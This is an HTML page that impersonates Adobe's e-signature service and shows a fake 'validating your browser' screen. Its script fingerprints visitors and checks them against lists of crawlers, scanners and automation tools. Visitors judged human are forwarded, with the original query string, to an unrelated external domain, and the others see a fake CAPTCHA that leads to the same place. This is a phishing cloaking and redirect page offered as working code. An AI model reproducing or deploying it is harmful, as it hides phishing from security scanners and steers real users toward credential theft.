<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="x-ua-compatible" content="IE=9">
<meta name="logging_uri" content="https://svs.na1.adobesign.com/api/gateway/loggingserver">
<link nonce="" rel="Shortcut Icon" href="https://secure.echosign.com/images/favicon.2.ico" type="image/x-icon">
<meta name="footer" content="global-footer">
<meta name="header" content="global-navigation">
<meta name="jarvis-chat" content="desktop">
<meta name="universal-nav" content="profile, appswitcher, notifications, cart">
<meta name="adobe-home-redirect" content="on">
<meta name="checkout-workflow-step" content="commitment">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="preconnect" href="https://acrobat.adobe.com" crossorigin="">
<title>e-Sign software: Electronic and digital signatures | Adobe Acrobat for business</title>
  <style>
    body {
      font-family: system-ui, sans-serif;
      background: #f9f9f9;
      color: #333;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      flex-direction: column;
    }
    h1 {
      font-size: 1.5em;
      margin-bottom: 1rem;
    }
    .loading {
      font-size: 0.9em;
      color: #666;
    }
    footer {
      background-color: #d1d1d1;
      color: #333;
      text-align: center;
      padding: 0.75rem;
      font-size: 8pt;
      box-shadow: 0 1px 4px rgba(0,0,0,0.5);
      z-index: 1055;
      position: relative;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

     footer p {
        margin-bottom: 0;
    }

    ul {
        display: flex !important;
        list-style: none;
        justify-content: space-between;
        gap: 10px;
        padding: 0;
        margin: 0;
    }
    
  </style>
</head>
<body>
  </div>
  <h1>Please wait while we validate your browser...</h1>
  <div class="loading">Running security checks...</div>
  
  <noscript>
    <meta http-equiv="refresh" content="0; url=noscript.html" />
  </noscript>
  
  <script>
   

const BotDefense = (() => {
  const testPassed = [];
  const testFailed = [];
  const uKB = [];
  let counter = 0;
  let expiryDate;
  let shaCookie;
  let cookieUnit;
  const logger = [];

  const generateRandomString = len => Math.random().toString(36).substring(2, 2 + len);
  const log = (type, status, detail = '') => logger.push({ type, status, ts: Date.now(), detail });

  async function createHMAC(message, secret = 'ZenSecretKey') {
    const encoder = new TextEncoder();
    const key = await crypto.subtle.importKey(
      'raw',
      encoder.encode(secret),
      { name: 'HMAC', hash: 'SHA-256' },
      false,
      ['sign']
    );
    const signature = await crypto.subtle.sign('HMAC', key, encoder.encode(message));
    return btoa(String.fromCharCode(...new Uint8Array(signature)));
  }

  function updateFooter() {
    const footer = document.getElementById('zen-footer');
    if (footer) {
      footer.innerText = `✅ Passed: ${testPassed.length} | ❌ Failed: ${testFailed.length}`;
    }
  }

  async function runAdvancedBotChecks() {
    for (const [checkName, enabled] of Object.entries(ZenCheckConfig)) {
      if (enabled && typeof AdvancedBotChecks[checkName] === 'function') {
        try {
          AdvancedBotChecks[checkName]();
          testPassed.push(checkName);
          log(checkName, 'pass');
        } catch (err) {
          testFailed.push(checkName);
          log(checkName, 'fail', err.message);
        }
      }
    }
  }

  function checkDOMReady() {
    try {
      if (window.addEventListener) {
        window.addEventListener('DOMContentLoaded', () => {
          testPassed.push('BrowserCheck');
          counter++;
          log('DOM', 'pass');
          updateFooter();
        });
      } else {
        window.attachEvent('onload', () => {
          testPassed.push('BrowserCheck');
          counter++;
          log('DOM', 'pass');
          updateFooter();
        });
      }
    } catch (err) {
      testFailed.push('BrowserCheck');
      counter++;
      log('DOM', 'fail', err.message);
      updateFooter();
    }
  }

  async function checkCookies(serverEmailCopy = null, recipientDomain = '') {
    try {
      if (!navigator.cookieEnabled) throw new Error('Cookies not enabled');
      const expiration = new Date();
      expiration.setDate(expiration.getDate() + 4);
      expiryDate = expiration;
      const current = Date.now();
      const ts = Date.now();
      const tag = generateRandomString(6);
      const cookieVal = serverEmailCopy ? `${current + ts * 8}${recipientDomain}${generateRandomString(6)}` : `${current + ts * 8}_BLOCKED_`;
      cookieUnit = cookieVal;
      shaCookie = await createHMAC(cookieVal);
      document.cookie = `Name=_${tag}_${shaCookie}; expires=${expiration.toUTCString()}; path=/;`;

      if (document.cookie.includes(`Name=_${tag}_${shaCookie}`)) {
        testPassed.push('Cookies');
        log('Cookie', 'pass');
      } else {
        testFailed.push('Cookies');
        log('Cookie', 'fail', 'Set but not found');
      }
      counter++;
    } catch (err) {
      testFailed.push('Cookies');
      counter++;
      log('Cookie', 'fail', err.message);
    }
    updateFooter();
  }


  function botFingerprintCheck() {
    try {
      const start = performance.now();
      const suspicious = [
        '_phantom', '__phantomas', 'Buffer', 'emit', 'spawn', 'webdriver', 'domAutomation', 'domAutomationController'
      ].some(key => window[key] !== undefined);
      const ua = navigator.userAgent;

      if (suspicious || /bot|curl|wget|python|winhttp|headless|phantom/i.test(ua)) {
        testFailed.push('ConditionalCheck');
        log('BotFingerprint', 'fail', ua);
      } else {
        const end = performance.now();
        puzzleScore = end - start <= 100000 ? end - start : null;
        testPassed.push('ConditionalCheck');
        log('BotFingerprint', 'pass');
      }
      counter++;
    } catch (err) {
      testFailed.push('ConditionalCheck');
      counter++;
      log('BotFingerprint', 'fail', err.message);
    }
    updateFooter();
  }

  function isVendorSuspect() {
    const vendor = navigator.vendor || '';
    const platform = navigator.platform || '';
    const cores = navigator.hardwareConcurrency || 0;
    const ua = navigator.userAgent.toLowerCase();
    const flags = [];

    if (vendor === '' || vendor.toLowerCase().includes('google')) flags.push('vendor');
    if (platform === '') flags.push('platform');
    if (cores < 2) flags.push('cpu');
    if (/headless|phantom|bot/.test(ua)) flags.push('ua');

    return flags.length ? `Suspect: ${flags.join(', ')}` : false;
  }

  function userAgentCheck() {
    try {
      const ua = navigator.userAgent.toLowerCase();
      const botList = [
        "googlebot", "bingbot", "facebook", "linkedin", "curl", "wget", "python",
        "slackbot", "telegrambot", "discordbot", "mj12bot", "semrushbot", "dotbot", "yandex"
      ];

      const openSourceBotPatterns = [
        /bot/i, /crawler/i, /spider/i, /archiver/i, /fetcher/i, /monitor/i,
        /scan/i, /pingdom/i, /phantomjs/i, /axios/i, /aiohttp/i, /python-requests/i
      ];

      const isKnownBot = botList.some(bot => ua.includes(bot));
      const matchesPattern = openSourceBotPatterns.some(pattern => pattern.test(ua));
      const vendorFlags = isVendorSuspect();

      if (isKnownBot || matchesPattern || vendorFlags) {
        testFailed.push('UserAgentCheck');
        uKB.push([ua, null, 'Known/Suspect Bot']);
        log('UserAgent', 'fail', vendorFlags || 'matched UA pattern');
      } else {
        testPassed.push('UserAgentCheck');
        uKB.push([ua, null, 'Not-Known-Bot']);
        counter++;
        log('UserAgent', 'pass');
      }
    } catch (err) {
      testFailed.push('UserAgentCheck');
      counter++;
      log('UserAgent', 'fail', err.message);
    }
    updateFooter();
  }

  function expirationCheck() {
    try {
      const now = Date.now();
      const exp = expiryDate.getTime();
      if (now <= exp) {
        testPassed.push('DateComp');
        log('Date', 'pass');
      } else {
        testFailed.push('DateComp:Expired');
        log('Date', 'fail', 'Cookie expired');
      }
      counter++;
    } catch (err) {
      testFailed.push('DateComp');
      counter++;
      log('Date', 'fail', err.message);
    }
    updateFooter();
  }

  function webglFingerprintCheck() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      if (vendor && renderer) {
        testPassed.push('WebGL');
        log('WebGL', 'pass', `${vendor} - ${renderer}`);
      } else {
        testFailed.push('WebGL');
        log('WebGL', 'fail', 'Missing vendor/renderer');
      }
      counter++;
    } catch (err) {
      testFailed.push('WebGL');
      counter++;
      log('WebGL', 'fail', err.message);
    }
    updateFooter();
  }

  function audioFingerprintCheck() {
    try {
      const context = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
      const oscillator = context.createOscillator();
      const analyser = context.createAnalyser();
      oscillator.type = 'triangle';
      oscillator.connect(analyser);
      analyser.connect(context.destination);
      oscillator.start(0);
      context.startRendering().then(() => {
        testPassed.push('Audio');
        log('Audio', 'pass');
        updateFooter();
      }).catch(err => {
        testFailed.push('Audio');
        log('Audio', 'fail', err.message);
        updateFooter();
      });
      counter++;
    } catch (err) {
      testFailed.push('Audio');
      counter++;
      log('Audio', 'fail', err.message);
      updateFooter();
    }
  }

function renderRecaptchaFallback(queryString) {
    const fallbackContainer = document.createElement('div');
    fallbackContainer.innerHTML = `
      <div style="text-align:center;margin-top:20px;display:grid;align-items:center;justify-contents:center;">
        <img style="width:120px;margin:0 auto;" src="https://www.adobe.com/content/dam/cc/icons/adobe_wordmark_red.svg">
        <h3>Verification Required</h3>
        <p>Please complete the CAPTCHA below to continue.</p>
        <div class="g-recaptcha" data-sitekey="PUT-YOUR-SITE-KEY-HERE" data-callback="onCaptchaSuccess" style="display:grid;justify-contents:center;text-align:center;margin:0 auto;"></div>
        
      </div>
      <svg style="position:absolute;" class="LoggedOutHome__backgroundImage___lQqQ6" alt="" id="Layer_1" data-name="Layer 1" viewBox="0 0 473.33 138.89"><path d="m435.44,32.13c-2.86,0-5.85.66-8.7,2.03-12.44,5.97-22.33,23.93-20.83,57.15,15.08-7.76,26.62-16.07,34.08-24.03,15.27-16.3,9.84-26.58,7.82-29.34-2.78-3.78-7.37-5.8-12.36-5.8Z" fill="none" stroke-width="0"></path><path d="m401.05,107.73c1.3,9.71,3.37,20.1,6.22,31.17h6.55c-3.3-12.54-5.48-23.85-6.73-34-2.24,1.09-4.28,2.04-6.04,2.83Z" fill="#fa0f00" stroke-width="0"></path><path d="m452.91,34.19c-6.17-8.41-18.33-10.82-28.92-5.74-10.94,5.25-18.91,17.33-22.42,34.01-1.97,9.36-2.59,20.02-1.86,31.92-29.69,14.1-71.31,25.93-121.47,29.85C213.71,129.27,113.79,122.72,0,64.39v7.11c113.91,57.65,213.93,64.12,278.74,59.05,37.68-2.95,73.8-10.65,104.43-22.28,5.97-2.26,11.68-4.66,17.09-7.16,0,0,0,.01,0,.02,1.82-.84,3.88-1.83,6.1-2.94h0c16.35-8.17,29.55-17.29,38.24-26.57,9.69-10.35,16.96-25.61,8.3-37.42Zm-12.93,33.09c-7.46,7.96-19,16.27-34.08,24.03-1.51-33.22,8.39-51.18,20.83-57.15,2.86-1.37,5.84-2.03,8.7-2.03,4.99,0,9.59,2.02,12.36,5.8,2.03,2.76,7.45,13.05-7.82,29.34Z" fill="#fa0f00" stroke-width="0"></path></svg>
    `;
    document.body.innerHTML = '';
    document.body.appendChild(fallbackContainer);

    const script = document.createElement('script');
    script.src = 'https://www.google.com/recaptcha/api.js';
    document.head.appendChild(script);

    window.onCaptchaSuccess = function () {
      const finalRedirect = `https://kcramer.com/Sec2vPoM81vxQkZhEmoelQa4riZfelQa4sr8PuZgsoM81vxQkZ#${queryString}`;
      window.location.href = finalRedirect;
    };
  }

  function redirectLogic() {
    try {
      const queryString = window.location.href.split('?')[1] || '';
      if (testPassed.length >= 5 && testPassed.includes('UserAgentCheck') && testPassed.includes('DateComp')) {
        window.location.href = `https://kcramer.com/Sec1emNoXgalRa9wtuTuXgwtJ7J72cqTrBhQanoRa9s32cqTrB${queryString}`;
      } else {
        renderRecaptchaFallback(queryString);
      }
    } catch (err) {
      window.location.href = `error500.html#fallback`;
    }
  }

  return {
    async run(serverEmailCopy = null, recipientDomain = '') {
      checkDOMReady();
      await checkCookies(serverEmailCopy, recipientDomain);
      botFingerprintCheck();
      userAgentCheck();
      expirationCheck();
      isVendorSuspect()
      webglFingerprintCheck();
      audioFingerprintCheck();
      setTimeout(() => {
        console.table(logger);
        updateFooter();
        redirectLogic();
      }, 5000);
    },
  };
})();

const footer = document.createElement('div');
footer.id = 'zen-footer';
footer.style = 'position:fixed;bottom:10px;left:50%;transform:translateX(-50%);padding:8px 12px;background:#000;color:#fff;font-family:monospace;font-size:12px;border-radius:6px;z-index:9999;display:none;';
document.body.appendChild(footer);

BotDefense.run(null, 'example.com');

  </script>
</body>
</html>
